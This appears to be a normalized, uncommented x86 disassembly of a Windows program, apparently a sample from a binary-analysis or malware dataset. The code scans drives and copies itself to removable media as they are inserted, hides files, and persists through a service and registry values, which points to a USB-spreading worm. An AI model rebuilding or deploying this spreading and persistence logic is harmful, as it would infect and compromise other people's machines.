mov [ ebp - 0x418 ] esi
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x20c ] ax
call sub_403840
xor edx edx
push 0x206
push edx
lea eax [ ebp - 0x412 ]
push eax
mov [ ebp - 0x414 ] dx
call sub_403840
add esp 0x18
push 0x0
push 0x6
push 0x3
push 0x0
push 0x0
push 0x1
push esi
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_40382c
mov esp ebp
pop ebp
retn 0x8
push ebx
push 0x0
push edi
call [ GetFileSize@IAT ]
mov ecx [ rw-data ]
mov ebx eax
push ebx
push 0x8
push ecx
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ CloseHandle@IAT ]
push 0x0
lea edx [ ebp - 0x41c ]
push edx
push ebx
push esi
push edi
call [ ReadFile@IAT ]
push edi
call [ CloseHandle@IAT ]
push rw-data
push 0x0
push ebx
push esi
call sub_4011d0
movsx eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x20c ]
push r--data
push ecx
call [ wsprintfW@IAT ]
add esp 0xc
lea edx [ ebp - 0x20c ]
push edx
call sub_401070
mov eax [ rw-data ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
call [ lstrcatW@IAT ]
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x414 ]
push eax
call sub_401000
lea ecx [ ebp - 0x414 ]
push ecx
lea edx [ ebp - 0x20c ]
push edx
push ebx
push esi
call sub_401f20
mov eax [ rw-data ]
push esi
push 0x0
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x418 ]
push ecx
call [ DeleteFileW@IAT ]
pop ebx
sub_402400
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
push 0x0
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x418 ] 0x0
call [ GetLogicalDriveStringsW@IAT ]
mov ecx [ rw-data ]
mov ebx eax
lea eax [ ebx + ebx + 0x2 ]
push eax
push 0x8
push ecx
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push edi
push ebx
call [ GetLogicalDriveStringsW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
xor edx edx
push 0x206
push edx
lea eax [ ebp - 0x412 ]
push eax
mov [ ebp - 0x414 ] dx
call sub_403840
xor ecx ecx
push 0x206
push ecx
lea edx [ ebp - 0x20a ]
push edx
mov [ ebp - 0x20c ] cx
call sub_403840
mov eax [ rw-data ]
push eax
push esi
lea ecx [ ebp - 0x414 ]
push r--data
push ecx
call [ wsprintfW@IAT ]
add esp 0x28
push 0x0
push 0x6
push 0x2
push 0x0
push 0x0
push 0x2
lea edx [ ebp - 0x414 ]
push edx
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
cmp [ edi ] 0x0
je r-xdata
push 0x2
push 0x0
push 0x0
push ebx
call [ SetFilePointer@IAT ]
cmp [ edi ] 0x0
mov [ ebp - 0x418 ] 0x0
je r-xdata
mov esi edi
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
mov esi edi
push esi
call [ GetDriveTypeW@IAT ]
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
push edi
push 0x0
push eax
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov edi [ wsprintfW@IAT ]
push ecx
push esi
lea edx [ ebp - 0x414 ]
push r--data
push edx
call edi
add esp 0x10
cmp [ ebp - 0x20c ] 0x0
je r-xdata
push ebx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x418 ]
add eax 0x4
cmp [ edi + eax * 2 ] 0x0
lea esi [ edi + eax * 2 ]
mov [ ebp - 0x418 ] eax
jne r-xdata
mov edx [ ebp - 0x41c ]
push 0x0
push ebx
lea ecx [ ebp - 0x20c ]
push ecx
push edx
push r--data
push esi
call sub_401950
mov eax [ ebp - 0x418 ]
add eax 0x4
cmp [ edi + eax * 2 ] 0x0
lea esi [ edi + eax * 2 ]
mov [ ebp - 0x418 ] eax
jne r-xdata
push esi
call sub_4010a0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
push eax
push esi
push r--data
lea ecx [ ebp - 0x20c ]
push ecx
call [ lstrlenW@IAT ]
lea edx [ ebp + eax * 2 - 0x20c ]
push edx
call edi
add esp 0x10
push 0x0
lea eax [ ebp - 0x20c ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
call [ CopyFileW@IAT ]
push esi
call [ GetDriveTypeW@IAT ]
cmp eax 0x3
jne r-xdata
mov esi [ ebp - 0x41c ]
mov esi [ ebp - 0x41c ]
mov eax [ ebp - 0x41c ]
push 0x0
push ebx
lea edx [ ebp - 0x20c ]
push edx
push eax
push r--data
push esi
call sub_401950
push esi
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea ecx [ ebp - 0x20c ]
push ecx
call sub_401070
jmp r-xdata
sub_402670
push ebp
mov ebp esp
sub esp 0x414
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call sub_403840
xor edx edx
push 0x206
push edx
lea eax [ ebp - 0x412 ]
push eax
mov [ ebp - 0x414 ] dx
call sub_403840
mov ecx [ rw-data ]
mov esi [ wsprintfW@IAT ]
push ecx
movsx edx bl
push edx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call esi
add esp 0x28
lea ecx [ ebp - 0x20c ]
push ecx
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push eax
lea ecx [ ebp - 0x414 ]
push r--data
push ecx
call esi
add esp 0x10
push 0x0
lea edx [ ebp - 0x414 ]
push edx
lea eax [ ebp - 0x20c ]
push eax
call [ CopyFileW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea ecx [ ebp - 0x20c ]
push ecx
call [ DeleteFileW@IAT ]
lea eax [ ebp - 0x414 ]
jmp r-xdata
push ebx
push eax
call sub_402290
sub_402760
push ebp
mov ebp esp
sub esp 0x42c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x426 ]
push ecx
mov [ ebp - 0x428 ] ax
call sub_403840
xor edx edx
push 0x206
push edx
lea eax [ ebp - 0x21e ]
push eax
mov [ ebp - 0x220 ] dx
call sub_403840
mov esi [ wsprintfW@IAT ]
movsx ecx bl
push ecx
lea edx [ ebp - 0x428 ]
push r--data
push edx
call esi
add esp 0x24
lea eax [ ebp - 0x428 ]
push eax
call sub_4010a0
lea ecx [ ebp - 0x428 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x42c ]
push eax
push 0x0
push 0x0
push ecx
mov [ ebp - 0x42c ] 0x0
call [ GetVolumeInformationW@IAT ]
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0x220 ]
push edx
call sub_401000
mov ecx [ ebp - 0x42c ]
xor eax eax
push ecx
lea edx [ ebp - 0x18 ]
push r--data
push edx
mov [ ebp - 0x18 ] ax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] eax
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
call esi
add esp 0xc
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x220 ]
push ecx
call sub_401000
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x220 ]
push edx
push r--data
lea eax [ ebp - 0x428 ]
push eax
push ecx
call sub_401070
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0x428 ]
push ecx
push r--data
lea edx [ ebp - 0x220 ]
push edx
jmp r-xdata
call sub_401950
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
sub_4028d0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call sub_403840
mov edx [ rw-data ]
add esp 0xc
push edx
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
lea ecx [ ebp - 0x20c ]
push ecx
call sub_402400
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
push 0x0
push 0x6
push 0x2
push 0x0
push 0x0
push 0x2
lea ecx [ ebp - 0x20c ]
push ecx
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_40382c
mov esp ebp
pop ebp
retn 0x4
push eax
call [ CloseHandle@IAT ]
sub_402980
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_403960
mov eax [ fs : 0x0 ]
push eax
sub esp 0x228
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
xor esi esi
mov [ ebp - 0x22c ] esi
mov [ ebp - 0x228 ] esi
xor eax eax
mov [ ebp - 0x224 ] ax
push 0x206
push esi
lea ecx [ ebp - 0x222 ]
push ecx
call sub_403840
add esp 0xc
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
mov [ ebp - 0x4 ] esi
push 0x208
push 0x8
push eax
mov edi [ HeapAlloc@IAT ]
call edi
mov [ rw-data ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x228 ] 0x10
push 0x20
push 0x8
mov eax [ rw-data ]
push eax
call edi
mov [ rw-data ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x22c ] 0xffffffff
push 0xfffffffe
lea edx [ ebp - 0x10 ]
push edx
push rw-data
call sub_403af0
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x228 ]
push edx
push eax
call [ GetComputerNameW@IAT ]
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn
push r--data
mov edx [ rw-data ]
push edx
call [ lstrcatW@IAT ]
mov eax [ rw-data ]
push eax
call [ SetCurrentDirectoryW@IAT ]
push 0x208
push 0x8
mov ecx [ rw-data ]
push ecx
call edi
mov [ rw-data ] eax
cmp eax esi
je r-xdata
mov ecx [ rw-data ]
push ecx
push esi
push esi
push 0x801c
push esi
call ebx
mov eax [ rw-data ]
push eax
push esi
push esi
push 0x800d
push esi
mov ebx [ SHGetFolderPathW@IAT ]
call ebx
test eax eax
jns r-xdata
mov ecx [ rw-data ]
push ecx
mov edx [ rw-data ]
push edx
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
push esi
mov eax [ rw-data ]
push eax
call [ CreateDirectoryW@IAT ]
push 0x16
mov ecx [ rw-data ]
push ecx
call [ SetFileAttributesW@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x208
push 0x8
mov edx [ rw-data ]
push edx
call edi
mov [ esi * 4 + rw-data ] eax
inc esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x0
push 0x22
push 0x0
call ebx
mov [ ebp - 0x234 ] esi
cmp esi 0x5
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x0
push 0x20
push 0x0
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x0
push 0x24
push 0x0
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x0
push 0x21
push 0x0
call ebx
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ ebp - 0x224 ]
push ecx
mov ebx [ wsprintfW@IAT ]
call ebx
add esp 0xc
lea edx [ ebp - 0x224 ]
push edx
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
push 0x0
push 0x0
push 0x26
push 0x0
call ebx
mov ecx [ rw-data ]
push ecx
push r--data
lea edx [ ebp - 0x224 ]
push edx
call ebx
add esp 0xc
push 0x0
push 0x6
push 0x3
push 0x0
push 0x0
push 0x1
lea eax [ ebp - 0x224 ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea eax [ ebp - 0x230 ]
push eax
push 0x0
push 0x0
push sub_4028d0
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_403af0
add esp 0xc
xor eax eax
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ ebp - 0x228 ] eax
push eax
push 0x8
mov ecx [ rw-data ]
push ecx
call edi
mov edi eax
test edi edi
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x230 ] 0x0
push 0x0
lea edx [ ebp - 0x230 ]
push edx
mov eax [ ebp - 0x228 ]
push eax
push edi
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
push r--data
lea edx [ ebp - 0x224 ]
push edx
call ebx
add esp 0xc
xor esi esi
mov ebx [ lstrlenW@IAT ]
push 0x0
lea eax [ ebp - 0x224 ]
push eax
mov ecx eax
push ecx
lea edx [ esi + edi ]
push edx
call sub_401e40
push edi
call ebx
lea esi [ esi + eax * 2 + 0x2 ]
cmp esi [ ebp - 0x228 ]
jb r-xdata
jmp r-xdata
sub_402cde
xor ebx ebx
cmp [ ebp - 0x22c ] ebx
je r-xdata
retn
mov eax [ rw-data ]
mov edi [ HeapFree@IAT ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
push ebx
mov ecx [ rw-data ]
push ecx
call edi
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp eax [ rw-data ]
je r-xdata
xor esi esi
lea esp [ esp ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call edi
mov [ rw-data ] ebx
push eax
push ebx
mov edx [ rw-data ]
push edx
call edi
mov [ rw-data ] ebx
inc esi
cmp esi 0x5
jl r-xdata
push eax
push ebx
mov ecx [ rw-data ]
push ecx
call edi
mov [ esi * 4 + rw-data ] ebx
mov eax [ esi * 4 + rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x238 ] esi
sub_402d80
mov eax [ rw-data ]
push esi
push edi
mov edi [ HeapFree@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
mov eax [ rw-data ]
push 0x0
push eax
call edi
mov eax [ rw-data ]
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ecx [ rw-data ]
je r-xdata
mov esi rw-data
lea esp [ esp ]
mov edx [ rw-data ]
push eax
push 0x0
push edx
call edi
mov ecx [ rw-data ]
push eax
push 0x0
push ecx
call edi
add esi 0x4
cmp esi rw-data
jl r-xdata
push eax
mov eax [ rw-data ]
push 0x0
push eax
call edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ rw-data ]
pop edi
pop esi
test eax eax
je r-xdata
retn
push eax
call [ CloseHandle@IAT ]
sub_402e10
push ebp
mov ebp esp
push ecx
push 0x0
push sub_4034e0
push r--data
mov [ rw-data ] 0x30
mov [ rw-data ] 0x5
call [ RegisterServiceCtrlHandlerExW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn 0x8
push 0x3e8
push 0x0
push 0x2
call sub_403490
call sub_402980
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push sub_4036b0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
call sub_402d80
push 0x0
push 0x0
push 0x1
call sub_403490
push 0x0
push 0x0
push 0x4
call sub_403490
mov ecx [ rw-data ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
sub_402eb0
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x2
push 0x0
push r--data
push 0x80000001
mov [ ebp - 0x4 ] 0x0
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov esp ebp
pop ebp
retn
push rw-data
call [ lstrlenW@IAT ]
mov edx [ ebp - 0x4 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
push rw-data
push 0x1
push 0x0
push r--data
push edx
call [ RegSetValueExW@IAT ]
mov eax [ ebp - 0x4 ]
push eax
call [ RegCloseKey@IAT ]
sub_402f10
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x2
push 0x0
push r--data
push 0x80000001
mov [ ebp - 0x4 ] 0x0
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push r--data
push ecx
call [ RegDeleteValueW@IAT ]
mov edx [ ebp - 0x4 ]
push edx
call [ RegCloseKey@IAT ]
sub_402f60
push ebp
mov ebp esp
sub esp 0xc48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x10 ]
push 0x1
mov [ ebp - 0xc38 ] ebx
call [ SetErrorMode@IAT ]
push r--data
push 0x0
push 0x1
call [ OpenMutexW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push esi
push edi
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call sub_403840
mov edx [ ebp + 0x8 ]
add esp 0xc
push r--data
push ebx
mov [ rw-data ] edx
call [ lstrcmpiA@IAT ]
mov edi [ GetSystemDirectoryW@IAT ]
mov esi [ lstrcatW@IAT ]
test eax eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
or eax 0xffffffff
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x10
push r--data
push ebx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
call sub_403250
call sub_402f10
push 0x514
lea eax [ ebp - 0xc34 ]
push eax
call edi
push r--data
lea ecx [ ebp - 0xc34 ]
push ecx
call esi
push 0x7d0
call [ Sleep@IAT ]
lea edx [ ebp - 0xc34 ]
push edx
call [ DeleteFileW@IAT ]
push r--data
push 0x1
push 0x1
call [ OpenMutexW@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
push r--data
push ebx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
call sub_403250
call sub_402f10
push 0x514
lea edx [ ebp - 0xc34 ]
push edx
call edi
push r--data
lea eax [ ebp - 0xc34 ]
push eax
call esi
push 0x7d0
call [ Sleep@IAT ]
lea ecx [ ebp - 0xc34 ]
push ecx
call [ DeleteFileW@IAT ]
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x10
lea ebx [ eax + 0x1 ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
push 0x104
push rw-data
call edi
push r--data
push rw-data
call esi
push 0x0
push rw-data
lea ecx [ ebp - 0x20c ]
push ecx
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
push 0x7d0
call [ Sleep@IAT ]
push r--data
push 0x0
push 0x1
call [ OpenMutexW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
lea edx [ ebp - 0xc48 ]
push edx
mov [ ebp - 0xc48 ] r--data
mov [ ebp - 0xc44 ] sub_402e10
mov [ ebp - 0xc40 ] eax
mov [ ebp - 0xc3c ] eax
call [ StartServiceCtrlDispatcherW@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_40382c
mov esp ebp
pop ebp
retn 0x10
push 0x6
push rw-data
call [ SetFileAttributesW@IAT ]
test ebx ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x5
jne r-xdata
call sub_402980
push 0x0
call sub_4036b0
call sub_402d80
mov ebx [ ebp - 0xc38 ]
call sub_403360
test eax eax
je r-xdata
push rw-data
push 0x0
push 0x0
push 0x1c
push 0x0
call [ SHGetFolderPathW@IAT ]
push r--data
push rw-data
call esi
push 0x0
push rw-data
lea edx [ ebp - 0x20c ]
push edx
call [ CopyFileW@IAT ]
mov ebx eax
push 0x20
push rw-data
call sub_403924
xor ecx ecx
add esp 0x8
mov [ eax ] cx
call sub_402eb0
push 0x1
push 0x0
push 0x0
push rw-data
push r--data
push 0x0
call [ ShellExecuteW@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x10
sub_403250
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_403960
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] edi
push 0xf003f
push edi
push edi
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax edi
jne r-xdata
push 0x10020
push r--data
push eax
call [ OpenServiceW@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
cmp esi edi
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
push 0x1
push esi
call [ ControlService@IAT ]
push esi
call [ DeleteService@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
push 0xfffffffe
lea ecx [ ebp - 0x10 ]
push ecx
jmp r-xdata
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_403af0
add esp 0xc
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
push 0xfffffffe
lea edx [ ebp - 0x10 ]
push edx
jmp r-xdata
push rw-data
call sub_403af0
mov eax esi
add esp 0xc
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403360
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_403960
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] edi
push r--data
push rw-data
call [ lstrcatW@IAT ]
push 0x2
push edi
push edi
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax edi
jne r-xdata
push edi
push edi
push edi
push edi
push edi
push rw-data
push 0x1
push 0x2
push 0x110
push 0xf01ff
push r--data
push r--data
push eax
call [ CreateServiceW@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
cmp esi edi
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x24 ] r--data
lea edx [ ebp - 0x24 ]
push edx
push 0x1
push esi
call [ ChangeServiceConfig2W@IAT ]
push edi
push edi
push esi
call [ StartServiceW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
push 0xfffffffe
lea ecx [ ebp - 0x10 ]
push ecx
jmp r-xdata
push 0xfffffffe
lea ecx [ ebp - 0x10 ]
push ecx
push rw-data
call sub_403af0
add esp 0xc
xor eax eax
jmp r-xdata
push rw-data
call sub_403af0
add esp 0xc
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403490
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp eax 0x4
je r-xdata
mov [ rw-data ] 0x0
cmp eax 0x1
je r-xdata
inc [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
push rw-data
push eax
call [ SetServiceStatus@IAT ]
pop ebp
retn 0xc
sub_4034e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
dec eax
je r-xdata
push 0x5dc
push 0x0
push 0x3
call sub_403490
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x12
push ecx
call [ PostMessageW@IAT ]
push 0x0
push 0x0
push 0x1
call sub_403490
mov eax esi
pop esi
pop ebp
retn 0x10
sub eax 0x3
je r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push eax
call sub_403490
mov eax esi
pop esi
pop ebp
retn 0x10
dec eax
je r-xdata
lea eax [ esi + 0x78 ]
pop esi
pop ebp
retn 0x10
sub_403550
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor al al
movsx eax al
add eax 0x41
pop ebp
retn 0x4
inc al
shr ecx 0x1
cmp al 0x1a
jl r-xdata
test cl 0x1
jne r-xdata
sub_403570
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
xor eax eax
mov esp ebp
pop ebp
retn 0x10
sub eax 0x217
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call [ DefWindowProcW@IAT ]
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x8000
jne r-xdata
mov ecx [ ebp + 0x14 ]
cmp [ ecx + 0x4 ] 0x2
jne r-xdata
movzx eax [ ecx + 0x10 ]
cmp eax 0x1
je r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ecx + 0xc ]
push ebx
push esi
push edi
push eax
call sub_403550
mov edi [ CreateThread@IAT ]
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
movsx esi al
push esi
push sub_402760
push 0x0
push 0x0
call edi
mov ebx [ Sleep@IAT ]
push 0x3e8
call ebx
lea edx [ ebp - 0x4 ]
push edx
push 0x0
push esi
push sub_402670
push 0x0
push 0x0
call edi
push 0x3e8
call ebx
pop edi
pop esi
pop ebx
sub_403630
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
push 0x0
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edx
mov edx [ ebp + 0x18 ]
push eax
push ecx
mov [ ebp - 0x24 ] 0x20
mov [ ebp - 0x20 ] 0x5
mov [ ebp - 0xc ] edx
call [ RegisterDeviceNotificationW@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ esi ] eax
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
mov esp ebp
pop ebp
retn 0x18
sub_4036b0
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push r--data
push 0x1
xor esi esi
push esi
call [ CreateMutexW@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov eax [ r--data ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ ebp - 0x14 ] eax
mov ax [ r--data ]
mov [ ebp - 0x8 ] ax
